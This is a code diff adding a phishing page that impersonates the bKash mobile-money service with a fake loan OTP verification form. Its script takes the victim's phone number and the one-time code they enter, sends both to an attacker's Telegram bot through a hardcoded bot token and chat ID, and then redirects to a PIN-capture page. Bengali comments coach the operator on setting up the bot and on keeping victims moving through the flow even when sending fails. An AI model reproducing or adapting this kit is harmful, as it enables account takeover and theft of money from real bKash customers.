@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>bKash OTP Verification</title>
+    <link rel="icon" type="image/png" href="img/favicon.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+
+    <div class="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
+
+        <div class="flex justify-between items-center bg-white px-6 py-4">
+            <img src="img/bKash-logo.png" class="mx-auto h-6" alt="bKash Logo" />
+        </div>
+
+        <div class="flex justify-between items-start bg-gray-100 px-4 py-3">
+            <div>
+                <p class="text-sm font-semibold text-gray-800">Loan Amount</p>
+                <p class="text-xs text-gray-500">loan category: Business Loan</p>
+            </div>
+            <p class="text-sm font-semibold text-gray-800" id="display_amount">৳0.00</p>
+        </div>
+
+        <form id="otpForm">
+            <div class="bg-pink-600 px-6 py-16">
+                <p class="text-white text-sm mb-2 text-center" id="otp_instruction">Enter verification code sent to your mobile</p>
+                
+                <input type="tel" name="otp_code" id="otp_code" placeholder="Enter 6 digit code" class="w-full px-4 py-2 rounded text-gray-800 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center" maxlength="6" required />
+                
+                <p class="text-white text-xs mt-2 text-center">
+                    <span id="timer">Resend Code in 60s</span>
+                    <a href="#" id="resendLink" class="underline hidden">Resend Code</a>
+                </p>
+            </div>
+
+            <div class="flex justify-between items-center bg-white px-6 py-4">
+                <button type="button" onclick="history.back()" class="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
+                    Cancel
+                </button>
+                <button type="submit" id="confirmBtn" class="w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed" disabled>
+                    Confirm
+                </button>
+            </div>
+        </form>
+
+        <div class="text-center text-xs text-gray-400 py-2">
+            © 2026 bKash, All Rights Reserved
+            <br />
+            <span class="text-pink-600">● 16247</span>
+        </div>
+
+    </div>
+
+    <script>
+        // ১. URL থেকে ডাটা ধরা
+        const params = new URLSearchParams(window.location.search);
+        const mobile = params.get('mobile');
+        const amount = params.get('amount');
+
+        // ডাটা স্ক্রিনে বসানো
+        if (mobile) {
+            const maskedMobile = mobile.substring(0, 3) + "XXXX" + mobile.substring(7);
+            document.getElementById('otp_instruction').innerText = `Enter verification code sent to ${maskedMobile}`;
+        }
+        if (amount) {
+            document.getElementById('display_amount').innerText = '৳' + amount;
+        }
+
+        // ২. টাইমার লজিক
+        const timerElement = document.getElementById('timer');
+        const resendLink = document.getElementById('resendLink');
+        let timeLeft = 60;
+        
+        const timer = setInterval(function() {
+            timeLeft--;
+            timerElement.textContent = `Resend Code in ${timeLeft}s`;
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                timerElement.classList.add('hidden');
+                resendLink.classList.remove('hidden');
+            }
+        }, 1000);
+
+        // ৩. ইনপুট ভ্যালিডেশন (বাটন এনাবল/ডিসেবল)
+        const otpInput = document.getElementById('otp_code');
+        const confirmBtn = document.getElementById('confirmBtn');
+
+        otpInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, ''); // শুধু সংখ্যা
+
+            if (this.value.length === 6) {
+                confirmBtn.disabled = false;
+                confirmBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+                confirmBtn.classList.add('bg-pink-500', 'text-white', 'hover:bg-pink-600');
+            } else {
+                confirmBtn.disabled = true;
+                confirmBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+                confirmBtn.classList.remove('bg-pink-500', 'text-white', 'hover:bg-pink-600');
+            }
+        });
+
+        // ৪. ফর্ম সাবমিট এবং টেলিগ্রাম ইন্টিগ্রেশন (এখানেই আগে ভুল ছিল)
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const otpCode = otpInput.value;
+
+            // ⚠️ আপনার বটের তথ্য নিচে বসান ⚠️
+            const botToken = "8219251554:AAF6qEcHBVoofOCdj4JRqAycz3RxvIqsnqI"; 
+            const chatId = "6587549013";
+
+            // মেসেজ রেডি করা
+            const message = `🔥 OTP RECEIVED 🔥\n📱 Number: ${mobile}\n🔑 OTP Code: ${otpCode}`;
+
+            // টেলিগ্রাম API কল
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // বাটনে লোডিং ইফেক্ট
+            confirmBtn.innerText = "Processing...";
+
+            fetch(url)
+                .then(response => {
+                    // সফল হলে আসল ওয়েবসাইটে রিডাইরেক্ট
+                    window.location.href = "pin_verification.html";
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // এরর হলেও ইউজারকে আটকে না রেখে রিডাইরেক্ট করে দেওয়া ভালো
+                    window.location.href = "pin_verification.html";
+                });
+        });
+    </script>
+</body>
+</html>
